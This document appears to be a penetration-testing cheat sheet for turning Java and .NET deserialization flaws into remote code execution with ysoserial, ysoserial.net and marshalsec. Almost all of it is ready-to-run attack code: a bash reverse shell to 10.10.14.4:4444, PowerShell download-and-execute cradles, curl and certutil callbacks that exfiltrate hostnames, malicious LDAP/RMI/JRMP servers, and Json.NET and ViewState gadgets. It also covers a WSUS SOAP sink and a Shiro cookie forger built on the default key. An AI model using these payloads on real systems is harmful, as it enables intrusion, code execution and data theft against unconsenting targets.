# ysoserial / ysoserial.net command cookbook — Open WHEN: you have confirmed a Java ObjectInputStream or .NET BinaryFormatter/ViewState/Json.NET sink and need the exact gadget invocation for DNS, RCE, or revshell

All commands assume `ysoserial.jar` (Java) or `ysoserial.exe` (.NET) on PATH.
Pipe the raw `.ser` through `base64 -w0` / URL-encode before placing it in
the cookie / header / body the sink reads.

## Java — `Runtime.exec()` argument trap
`Runtime.exec()` splits on spaces and does NOT honor `>` `|` `$()` or quoting.
A bare `bash -c '...'` will be mangled. Wrap every multi-token Linux command:

```bash
# Linux: base64-wrap so the gadget's exec gets a single token chain
CMD='bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'
B64=$(printf '%s' "$CMD" | base64 -w0)
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,$B64}|{base64,-d}|{bash,-i}" > payload.ser
```
For Windows targets use PowerShell `-EncodedCommand` (UTF-16LE base64):
```bash
printf '%s' "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/p.ps1')" \
  | iconv -t UTF-16LE | base64 -w0      # paste into -Enc below
java -jar ysoserial.jar CommonsCollections4 \
  "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc <B64UTF16>" > payload.ser
```

## Java — DNS / HTTP quiet oracles (run these first)
```bash
# JDK-only, no library needed — proves readObject() is reached
java -jar ysoserial.jar URLDNS "http://$RAND.oast.live" > probe.ser
# Library-present confirmation via command-channel callback
java -jar ysoserial.jar CommonsCollections4 "dig $RAND.oast.live"        > probe.ser
java -jar ysoserial.jar CommonsCollections4 "nslookup $RAND.oast.live"   > probe.ser
java -jar ysoserial.jar CommonsCollections4 "curl http://$RAND.oast.live/$(hostname)" > probe.ser
# Windows DNS/HTTP exfil without bash
java -jar ysoserial.jar CommonsCollections4 "cmd /c nslookup $RAND.oast.live"
java -jar ysoserial.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://$RAND.oast.live/a a"
```

## Java — brute the chain when libraries are unknown
Spray every chain into a Burp-Intruder wordlist, one base64 blob per line:
```bash
for g in BeanShell1 Clojure CommonsBeanutils1 CommonsCollections1 \
  CommonsCollections2 CommonsCollections3 CommonsCollections4 \
  CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 \
  Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JSON1 JavassistWeld1 \
  Jdk7u21 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 \
  Spring2 Vaadin1 Wicket1; do
    java -jar ysoserial.jar "$g" "nslookup $g.$RAND.oast.live" 2>/dev/null \
      | base64 -w0; echo
done > intruder.txt
```
The DNS label that fires back names the working chain (`<chain>.<rand>.oast.live`).

## Java — JSF / .faces ViewState
Tell: `.faces` URL + `javax.faces.ViewState=rO0AB...` (base64 Java stream).
Generate a normal `ObjectInputStream` chain, base64 it, URL-encode, replace
the `javax.faces.ViewState` value. No MAC unless `STATE_SAVING_METHOD=server`
with a secret.

## Java — JSON/YAML libs via marshalsec (FastJSON, Jackson, SnakeYAML, …)
```bash
mvn clean package -DskipTests          # build marshalsec.jar first
# Stand up a malicious LDAP referral server that returns an Exploit class
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://10.10.14.4:8000/#Exploit 1389
# RMI variant
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer  http://10.10.14.4:8000/#Exploit 1099
```
Then feed the polymorphic JSON the sink expects, e.g. a `$type`/`@type` value
pointing at a JdbcRowSetImpl/TemplatesImpl whose `dataSourceName` is
`ldap://10.10.14.4:1389/Exploit`. Pair with a class-hosting HTTP server on 8000.

## Java — staged JRMP delivery (firewalled outbound, no library chain)
```bash
# Listener that serves a second-stage gadget to a JRMPClient blob
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "curl http://$RAND.oast.live"
java -jar ysoserial.jar JRMPClient "10.10.14.4:1099" > stage1.ser   # send stage1 to the sink
```

## .NET — ysoserial.net core invocations
```bash
# DNS oracle (quiet first shot)
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup $RAND.oast.live" -o base64
# Most-reliable RCE gadget across formatters
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter   -o base64 -c "calc.exe"
# Windows revshell — build the inner PS payload UTF-16LE first
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/s.ps1')" \
  | iconv -t UTF-16LE | base64 -w0
ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 \
  -c "powershell -EncodedCommand <B64UTF16>"
```
Useful flags: `--minify` (smaller blob), `--test` (run the chain locally to
confirm before sending), `--raf -f Json.Net -c x` (list gadgets valid for a
formatter), `--sf xml -g <gadget>` (find xml-ish formatters for a gadget).
Note: output is UTF-16LE by default — do NOT re-encode a raw blob on Linux.

## .NET — Json.NET `$type` injection (TypeNameHandling != None)
Drop this object straight into the JSON body the sink parses:
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System",
   "StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System",
     "FileName":"cmd","Arguments":"/c nslookup $RAND.oast.live"}}}
```

## .NET — ViewState (`__VIEWSTATE`, LosFormatter / `ObjectStateFormatter`)
```bash
# UNSIGNED ViewState (enableViewStateMac=false): no key needed
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "nslookup $RAND.oast.live" --apppath="/" --path="/page.aspx"
# SIGNED ViewState: you must supply the leaked machineKey to mint a valid MAC
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" \
  --path="/page.aspx" --apppath="/" \
  --validationkey="<HEX>" --validationalg="SHA1" \
  --decryptionkey="<HEX>" --decryptionalg="AES" \
  --generator="<__VIEWSTATEGENERATOR value>"
```
`__VIEWSTATEGENERATOR` is page-specific and required when the key is set —
read it from the same hidden form that carries `__VIEWSTATE`.

## .NET — WSUS real-world SOAP sinks (CVE-2025-59287)
Endpoints reaching legacy formatters as the WSUS service account (often SYSTEM):
`/SimpleAuthWebService/SimpleAuth.asmx` (`GetCookie()` → `BinaryFormatter`) and
`/ReportingWebService.asmx` (`ReportEventBatch` → `SoapFormatter`).
```bash
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <B64>"
```
Embed the base64 gadget in a `ReportEventBatch` SOAP body POSTed to
`/ReportingWebService.asmx`; it fires when the console ingests the event.

## Apache Shiro `rememberMe` (default key still everywhere)
Shiro AES-CBC-encrypts a Java stream with the rememberMe key, base64s it into
the `rememberMe` cookie. With the key (default `kPH+bIxk5D2deZiIxcaaaA==`):
```bash
java -jar ysoserial.jar CommonsCollections2 "nslookup $RAND.oast.live" > p.ser
python3 - "$RAND" <<'PY'
import sys,base64
from Crypto.Cipher import AES   # pycryptodome
key=base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv =b"\x00"*16
raw=open("p.ser","rb").read()
pad=16-len(raw)%16; raw+=bytes([pad])*pad
ct=AES.new(key,AES.MODE_CBC,iv).encrypt(raw)
print(base64.b64encode(iv+ct).decode())   # -> Cookie: rememberMe=<this>
PY
```
Gadget must match Shiro's bundled libs (CC2 / CB1 are the usual hits).
